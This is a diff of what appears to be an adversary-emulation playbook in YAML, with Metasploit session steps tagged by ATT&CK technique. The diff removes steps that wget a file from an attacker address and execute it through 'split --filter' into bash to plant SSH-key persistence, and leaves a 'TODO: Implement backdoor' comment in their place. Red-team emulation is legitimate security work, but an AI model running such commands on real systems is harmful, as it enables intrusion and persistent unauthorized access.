@@ -182,23 +182,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-  - type: msf-session
-    session: "foothold"
-    cmd: "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1105,T1098.004"
-      tactics: "Command and Control,Persistence,Privilege Escalation"
-      technique_name:"Ingress Tool Transfer,Account Manipulation: SSH Authorized Keys"
-
-  - type: msf-session
-    cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
-    session: "foothold"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1218,T1098.004"
-      tactics: "Defense Evasion,Persistence,Privilege Escalation"
-      technique_name: "System Binary Proxy Execution,Account Manipulation: SSH Authorized Keys"
+  # TODO: Implement backdoor
 
   - type: msf-session
     cmd: rm /root/README.txt
